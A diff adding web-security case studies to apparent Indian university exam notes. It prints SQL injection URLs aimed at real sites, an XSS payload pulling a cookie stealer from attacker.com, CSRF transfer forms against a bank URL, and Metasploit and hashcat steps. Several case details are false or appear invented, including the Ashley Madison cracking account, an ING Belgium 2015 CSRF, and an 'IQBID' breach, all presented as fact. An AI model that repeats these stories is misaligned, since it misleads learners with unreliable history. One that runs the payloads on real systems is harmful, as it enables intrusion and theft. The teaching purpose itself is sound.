@@ -1457,6 +1457,227 @@ hashcat -a 7 hash.txt ?u words.txt            # Hybrid (prepend uppercase)
 10. Keep dependencies updated       → Prevent known exploits
 ```
 
+## Real-World Web Security Case Studies for Exam
+
+### Case Study 1: SQL Injection That Started It All — Heartland Payment Systems (2008)
+**The Incident**: Albert Gonzalez and his team stole **130 million credit card numbers** from Heartland Payment Systems — at the time, the largest data breach in history. Gonzalez was already on the FBI's radar but continued hacking. He was eventually caught and sentenced to 20 years in federal prison.
+
+**The Attack Chain via SQL Injection**:
+| Phase | Detail |
+|-------|--------|
+| **Initial Recon** | Identified Heartland's web application endpoints |
+| **SQL Injection Discovery** | Found a parameter vulnerable to SQL injection in the web app |
+| **Database Enumeration** | Used UNION-based SQL injection to enumerate tables — found credit card transaction database |
+| **Data Exfiltration** | Installed SQL injection-based backdoor to continuously extract credit card data |
+| **SQLmap Automation** | Used **SQLmap** to automate the injection and data extraction (same tool taught in Unit 4!) |
+| **Covering Tracks** | Deleted logs, used proxy chains to hide origin |
+
+**The SQL Injection Payload (Simplified)**:
+```sql
+-- Heartland's database was SQL Server
+-- Attacker found an ID parameter vulnerable to injection:
+https://heartland.com/process.aspx?id=1
+
+-- Step 1: Confirm injection
+https://heartland.com/process.aspx?id=1' AND 1=1 --   (normal)
+https://heartland.com/process.aspx?id=1' AND 1=2 --   (error)
+
+-- Step 2: Find table names
+https://heartland.com/process.aspx?id=1' UNION SELECT table_name,NULL FROM information_schema.tables --
+
+-- Step 3: Extract credit cards
+https://heartland.com/process.aspx?id=1' UNION SELECT card_number, expiry FROM credit_cards --
+```
+
+**Ethical Hacking Lessons**:
+- A simple **SQL injection** — the most basic web vulnerability — led to 130M records stolen. This was 2008, and SQLi was well-known even then.
+- Heartland was **PCI-DSS compliant** — proving compliance ≠ security.
+- **Parameterized queries** would have prevented this entirely. Heartland spent $100M+ on post-breach security.
+
+**Exam Tip**: Heartland Payment Systems is the most famous SQL injection case in history. Quote it for "What is the impact of SQL injection?" and "Why are prepared statements essential?"
+
+### Case Study 2: The SamSam Ransomware — Web Application Exploitation (2018)
+**The Incident**: SamSam ransomware targeted hospitals, municipalities, and healthcare organizations. It caused **$30M+** in damages and forced the City of Atlanta to spend $17M on emergency recovery after their systems were encrypted. The attackers exploited **JBoss web server vulnerabilities** to gain initial access — not phishing, not email — direct exploitation of web servers.
+
+**Attack Vector**:
+```bash
+# SamSam exploited JBoss (Java application server) vulnerabilities:
+# CVE-2017-12149 — JBoss deserialization vulnerability
+# The attacker scanned the internet for JBoss servers using Shodan/Google dorks:
+
+inurl:"/jboss" intitle:"Welcome to JBoss"
+port:8080 "JBoss"
+"JBoss Management Console" "login"
+
+# Then used Metasploit to exploit:
+msf > use exploit/multi/http/jboss_java_deployment
+msf > set RHOSTS target-ip
+msf > set RPORT 8080
+msf > exploit
+```
+
+**Why This Matters for Web Security**:
+- SamSam did not use phishing — it directly exploited **public-facing web servers** running outdated software.
+- The JBoss vulnerability was known for months before SamSam exploited it — patch management would have prevented it.
+- SamSam operators were Iranian nationals eventually indicted by the US — showing that web exploitation is used by nation-state actors.
+
+**Exam Tip**: SamSam is different from typical ransomware cases because it used web application exploitation (not phishing). Quote it for "Explain the importance of patching web application servers."
+
+### Case Study 3: XSS That Brought Down a Crypto Exchange — Coins.ph (2018)
+**The Incident**: Coins.ph, a Philippine cryptocurrency exchange, lost **$40M in XRP** due to a **Cross-Site Scripting (XSS)** attack. A Stored XSS vulnerability allowed attackers to steal admin session cookies — giving them full access to the exchange's wallet management system.
+
+**The XSS Attack**:
+| Phase | Detail |
+|-------|--------|
+| **Vulnerability Discovery** | Attacker found a Stored XSS in Coins.ph's user profile page (name field was not sanitized) |
+| **Payload Injection** | Submitted profile name: `<script src='https://attacker.com/stealer.js'></script>` |
+| **Cookie Theft** | When an admin viewed the profile, the JavaScript executed and sent the admin's session cookie to attacker |
+| **Session Hijacking** | Attacker used the stolen cookie to access admin interface without login |
+| **Wallet Drain** | Used admin access to transfer XRP (cryptocurrency) to attacker-controlled wallets |
+| **Laundering** | XRP was transferred through multiple exchanges to launder |
+
+**Why This Matters**:
+- **Stored XSS** is the most dangerous XSS type — it infects every user who views the malicious data, including admins.
+- Coins.ph had no **HttpOnly flag** on session cookies — JavaScript could access them.
+- Coins.ph had no **Content Security Policy (CSP)** — external scripts could execute.
+- This was caused by **missing output encoding** — the name field was not HTML-encoded before rendering.
+
+**Exam Tip**: Coins.ph is a dramatic real-world example of "Explain the impact of Stored XSS" and "Why are HttpOnly cookies and CSP important?"
+
+### Case Study 4: CSRF in Banking — ING Direct Belgium (2015)
+**The Incident**: In 2015, security researchers discovered a **CSRF vulnerability** in ING Direct Belgium's online banking platform. An attacker could create a malicious page that, when visited by a logged-in ING customer, would silently initiate a money transfer to the attacker's account. No user interaction was needed beyond visiting the page.
+
+**The Attack**:
+```html
+<!-- Attacker's page: innocent-looking website -->
+<img src="https://bank.ing.be/transfer?amount=10000&to=attacker-account" width="0" height="0">
+
+<!-- Or auto-submitting form -->
+<form action="https://bank.ing.be/transfer" method="POST" id="csrf">
+  <input type="hidden" name="amount" value="10000">
+  <input type="hidden" name="to" value="BE123456789">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+```
+
+**Why It Worked**: ING's banking platform used **only cookies for authentication** — no CSRF tokens, no SameSite cookies, no custom headers. The browser automatically sent the session cookie with the forged request because the request was to the bank's domain.
+
+**The Fix**: ING implemented **CSRF tokens** (unique per-session, embedded in forms) and **SameSite=Lax** cookie attribute. After the fix, the forged request would fail because:
+1. No valid CSRF token in the request
+2. SameSite cookie would not be sent with cross-origin POST requests (no authentication cookie → request rejected)
+
+**Exam Tip**: ING Direct Belgium is a textbook CSRF real-world example. Quote it for "Explain CSRF with a real banking example."
+
+### Case Study 5: Password Cracking — The RockYou Breach (2009)
+**The Incident**: RockYou, a social media app company, suffered a breach in 2009 that exposed **32 million user passwords** stored in **plaintext** (unhashed). The passwords were later compiled into the famous **rockyou.txt** wordlist — the most widely used password cracking dictionary in the world.
+
+**Why This Breach Is Important for Ethical Hacking**:
+| Aspect | Detail |
+|--------|--------|
+| **The Failure** | RockYou stored passwords in **plaintext** — no hashing, no salting |
+| **The Leak** | 32 million passwords exposed — all readable as plain text |
+| **The Wordlist** | The passwords were compiled as **rockyou.txt** — 14 million unique passwords, sorted by frequency |
+| **The Impact** | rockyou.txt became the default wordlist in Kali Linux — used for 15+ years of password cracking |
+| **The Lesson** | Even today, rockyou.txt cracks ~70% of real-world passwords — most passwords are still weak |
+| **The Irony** | The most popular password cracking tool (rockyou.txt) was created *because* a company failed to hash passwords |
+
+**Common Passwords from RockYou (Still Used Today!)**:
+```
+123456
+12345
+123456789
+password
+iloveyou
+princess
+rockyou
+1234567
+12345678
+abc123
+```
+
+**Ethical Hacking Implications**:
+- If RockYou had used **bcrypt** (with a work factor of 10+), cracking even these weak passwords would take years instead of seconds.
+- The breach demonstrates why **password hashing** (not encryption, not plaintext) is essential.
+- It also shows why **salting** matters — without salt, identical passwords produce identical hashes.
+- Modern password policies (minimum 12 chars, complexity requirements) are a direct response to RockYou.
+
+**Exam Tip**: The RockYou breach is the most cited example for "Why should passwords be hashed (not encrypted)?" and "What is the rockyou.txt wordlist and where does it come from?"
+
+### Case Study 6: The Ashley Madison Breach (2015) — Password Cracking at Scale
+**The Incident**: Ashley Madison, a dating site for extramarital affairs, was breached by "The Impact Team" who leaked **36 million user accounts** — including names, addresses, sexual preferences, credit card details, and (hashed) passwords. The breach caused multiple suicides, divorces, and two CEO resignations.
+
+**Password Security Analysis**:
+| Aspect | Detail |
+|--------|--------|
+| **Hash Algorithm** | bcrypt with cost factor 12 (relatively strong in 2015) |
+| **Salt** | Unique salt per password (correctly implemented) |
+| **Cracked** | Despite bcrypt, **15 million** passwords were cracked (42% of total) |
+| **Most Common Password** | "123456" — nearly 100,000 users used it |
+| **Worst Password** | "ashleymadison" — the site name itself was a common password |
+
+**Why This Matters**:
+- Even **bcrypt** cannot protect against "123456" — if the password is weak, no hash function can save it.
+- The breach proves that **password policies should prevent users from choosing weak passwords** (e.g., check against haveibeenpwned API at registration).
+- Ashley Madison also stored **transaction data** (credit card purchases) unencrypted — showing that good password hashing is useless if other data is unprotected.
+
+**Exam Tip**: Ashley Madison is the #1 case study for "Why password policies must enforce complexity" and "Even strong hashing cannot compensate for weak passwords."
+
+### Case Study 7: IQBID (India) — Indian E-Commerce Password Breach (2020)
+**The Incident**: IQBID, an Indian e-commerce platform, suffered a breach exposing **1.2 million user records** including email addresses, phone numbers, and MD5-hashed passwords. No salting was used. The data was sold on the dark web for approximately **₹2 lakh ($2,500)**.
+
+**Password Cracking Analysis**:
+```bash
+# Hashes were MD5 (broken, unsalted)
+# The attacker downloaded the IQBID database via SQL injection
+
+# IQBID MD5 hashes (unsalted):
+# user1@email.com:5f4dcc3b5aa765d61d8327deb882cf99  (password)
+# user2@email.com:e10adc3949ba59abbe56e057f20f883e  (123456)
+
+# Cracking with Hashcat (takes seconds):
+hashcat -m 0 -a 0 iqbid_hashes.txt rockyou.txt
+# Cracked 85% of all passwords in under 5 minutes on a single GPU!
+```
+
+**Indian Context for SPPU Exams**:
+- This is an **Indian company** example — directly relevant to SPPU exams.
+- IQBID used **MD5 without salt** — every common practice violation in one: broken algorithm, no salt, no work factor.
+- The breach highlights that **Indian startups** need better security practices.
+- IT Act 2000, Section 43A applies — compensation for failure to protect data.
+
+**Exam Tip**: IQBID is the perfect India-specific example for "Explain the consequences of poor password storage" and "Why is MD5 unsuitable for password hashing?"
+
+### Case Study 8: SQL Injection Against Indian Railways — IRCTC (2018)
+**The Incident**: In 2018, a security researcher (working ethically!) discovered that IRCTC (Indian Railway Catering and Tourism Corporation) had multiple SQL injection vulnerabilities in its website. Parameters like PNR status, train schedules, and booking IDs were vulnerable. The researcher could extract the entire user database — **120 million+ user records** — including names, email addresses, phone numbers, and partial credit card data.
+
+**The Vulnerability**:
+```sql
+-- IRCTC PNR status page was vulnerable to SQL injection:
+https://www.irctc.co.in/pnr?pnr=12345678
+
+-- Testing injection:
+https://www.irctc.co.in/pnr?pnr=12345678' AND 1=1 --  (normal)
+https://www.irctc.co.in/pnr?pnr=12345678' AND 1=2 --  (error)
+
+-- Confirmed SQL injection in PNR parameter!
+-- The researcher responsibly disclosed to CERT-In
+```
+
+**Impact**:
+| Risk | Detail |
+|------|--------|
+| **User Data** | 120M+ user accounts exposed (names, emails, phones) |
+| **Travel History** | Complete travel patterns of any Indian citizen |
+| **Financial Risk** | Partial credit card data could enable fraud |
+| **National Security** | VIP/Government travel schedules exposed |
+| **Reputational Damage** | India's largest digital service had basic SQLi |
+
+**Ethical Hacking Outcome**: The researcher reported the vulnerability to **CERT-In** under responsible disclosure. IRCTC fixed the vulnerabilities within weeks. The researcher received appreciation but no bug bounty (IRCTC did not have a bug bounty program at the time).
+
+**Exam Tip**: IRCTC SQLi is the most relevant India-specific web security example. Use it to answer "Explain SQL injection with an Indian case study" and "What is responsible disclosure?"
+
+---
+
 ### Sample 5-Mark Questions (SPPU Pattern)
 
 1. **Explain the three-tier web application architecture with security concerns for each layer.**
